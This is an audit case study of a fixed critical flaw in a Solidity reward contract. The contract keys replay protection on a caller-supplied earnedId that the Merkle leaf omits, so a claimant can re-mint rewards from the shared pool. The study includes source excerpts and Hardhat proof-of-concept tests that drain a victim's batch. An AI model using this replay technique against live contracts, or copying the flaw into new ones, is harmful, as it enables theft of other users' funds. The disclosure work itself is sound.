# Source-code-based

Project: Anonymous reward issuance and governance protocol (RG-01)
Category: Reward issuance and governance
Severity: Critical (final report assignment)
Engagement: Private engagement
Chain: EVM; Sepolia release attestation is separate from the historical local PoCs
Tech stack: Solidity, OpenZeppelin, ERC-20, Merkle proofs, Governor/Timelock, Trustline SDK, Hardhat, TypeScript
Evidence: Original local test source; mechanism assertions shown below
Remediation: Resolved — historical report disposition; current deployment state is not asserted
Contribution: Team security engagement; this case study does not claim sole discovery.
Proof availability: Excerpts and source references; the original harness is not distributed.

# earnedId replay drains the shared reward bucket

## Description

Claimant passing Trustline with a valid Merkle leaf repeatedly calls claimRewards using fresh earnedId values → leaf omits earnedId but replay protection includes it → the same entitlement repeatedly mints against the shared unclaimed pool.

Repeated issuance consumes other batches’ reservations; bounded by available pool unclaimed rewards and 100M [project] cap, not 1B global cap.

Resolved at commit 1c2c2fd in current NMRP1.claimRewards. Per-batch reservation and claim totals are stored at contracts/NMRP1.sol:60-64. The active-batch check, indexed replay bitmap, batch amount bound, and double-hashed leaf binding index, user, account identifier, amount, and pool are enforced at lines 250-281; the claim is marked before the external mint at lines 284-296. This closes both leaf replay and cross-batch reward-bucket draining.

### Mechanism step by step

#### Step 1 — earnedId is caller calldata, copied straight into the dedup key

earnedIds[] is an unvalidated calldata array; eid = earnedIds[i] is used only as a map key.

Source: `contracts/mintUscyRewards.sol:183-184` (commit 95fc21c).

```solidity
        address[] calldata poolAddresses,
        uint256[] calldata earnedIds
```

Source: `contracts/mintUscyRewards.sol:211-212` (commit 95fc21c).

```solidity
            bytes32 uuidHash = uuidHashes[i];
            uint256 eid = earnedIds[i];
```

#### Step 2 — replay guard keyed by earnedId

the ONLY anti-replay check; a fresh eid is an unused slot -> passes.

Source: `contracts/mintUscyRewards.sol:216-216` (commit 95fc21c).

```solidity
            require(!hasClaimed[uuidHash][user][eid], "Already claimed");
```

#### Step 3 — leaf construction OMITS earnedId

leaf binds user/accountIDHash/amount; earnedId is absent, so reuse re-verifies.

Source: `contracts/mintUscyRewards.sol:219-221` (commit 95fc21c).

```solidity
            bytes32 leaf = keccak256(
                abi.encode(user, accountIDHashes[i], amounts[i])
            );
```

#### Step 4 — set claimed then mint to user

marks the (uuid,user,eid) slot and mints; next tx with eid+1 repeats.

Source: `contracts/mintUscyRewards.sol:234-234` (commit 95fc21c).

```solidity
            hasClaimed[uuidHash][user][eid] = true;
```

Source: `contracts/mintUscyRewards.sol:237-237` (commit 95fc21c).

```solidity
            mintingContract.mint(poolAddresses[i], user, amounts[i]);
```

#### Step 5 — all batches reserve into ONE pool bucket; no per-uuid budget

every submitRewardData adds totalReward to the same pool.unclaimedRewards; claims draw that shared bucket with no per-uuid cap, so a replay drains other users' batches.

Source: `contracts/mintUscyRewards.sol:157-159` (commit 95fc21c).

```solidity
        merkleRoots[uuidHash] = newRoot;
        emit RewardSubmitted(totalReward, newRoot, uuidHash);
        mintingContract.updateUnclaimedRewards(address(this), totalReward);
```

## Proof of concept

A validated claimant reuses the same Merkle leaf with a fresh earnedId. Assertions show its balance rising from 100 to 200, the shared reservation falling to zero, and a separate victim claim reverting. A second test demonstrates the same root across two batches. The attacker already has a valid entitlement; the tests do not exceed the admitted pool cap.

The tests deploy fresh contracts with synthetic actors. Accounting and governance fixtures use an always-allowing validation mock; M9/M10 use a configurable mock. An EOA admitted as a pool stands in for a governance-approved pool contract where the boundary is tested directly. These are local tests, despite the original configuration requiring a Sepolia fork.

Test references:

- `PoCs/helpers/deploy.ts`
- `PoCs/merkle-replay/C1_earnedId_replay.test.ts`
- `PoCs/merkle-replay/C1_earnedId_replay.test.ts:78-97`
- `PoCs/merkle-replay/C1_shared_bucket_cross_batch.test.ts`
- `PoCs/merkle-replay/C1_shared_bucket_cross_batch.test.ts:32-76`

## Relevant test excerpts

Source: `PoCs/merkle-replay/C1_earnedId_replay.test.ts:78-97`.

```typescript
  it("same Merkle leaf plus fresh earnedId drains victim reward", async () => {
    await expectSharedBucket(toWei(200));

    await attackerClaimsSameLeafWith(1);
    expect(await core.[project].balanceOf(attackerAddr)).to.equal(toWei(100));
    await expectSharedBucket(toWei(100));

    // The only changed input is earnedId, which is not committed in the leaf.
    await attackerClaimsSameLeafWith(2);
    expect(await core.[project].balanceOf(attackerAddr)).to.equal(toWei(200));
    await expectSharedBucket(0n);

    expect(await rewards.hasClaimed(uuid, attackerAddr, 1)).to.equal(true);
    expect(await rewards.hasClaimed(uuid, attackerAddr, 2)).to.equal(true);

    await expect(victimClaimsLegitimateLeaf()).to.be.revertedWith(
      "Insufficient unclaimed"
    );
  });
});
```

Source: `PoCs/merkle-replay/C1_shared_bucket_cross_batch.test.ts:32-76`.

```typescript
  it("uses batch A replay to consume batch B unclaimed rewards", async () => {
    const pool = await rewards.getAddress();
    expect(await core.[project].getUnclaimedRewards()).to.equal(amount * 2n);

    await rewards
      .connect(core.attacker)
      .claimRewards(
        attackerAddr,
        [uuidA],
        [amount],
        [batchA.accountIDHashes[0]],
        [batchA.proofs[0]],
        [pool],
        [1]
      );

    // Same batch-A proof spends from the pool bucket reserved for batch B.
    await rewards
      .connect(core.attacker)
      .claimRewards(
        attackerAddr,
        [uuidA],
        [amount],
        [batchA.accountIDHashes[0]],
        [batchA.proofs[0]],
        [pool],
        [2]
      );

    expect(await core.[project].getUnclaimedRewards()).to.equal(0n);
    await expect(
      rewards
        .connect(core.victim)
        .claimRewards(
          victimAddr,
          [uuidB],
          [amount],
          [batchB.accountIDHashes[0]],
          [batchB.proofs[0]],
          [pool],
          [1]
        )
    ).to.be.revertedWith("Insufficient unclaimed");
  });
});
```
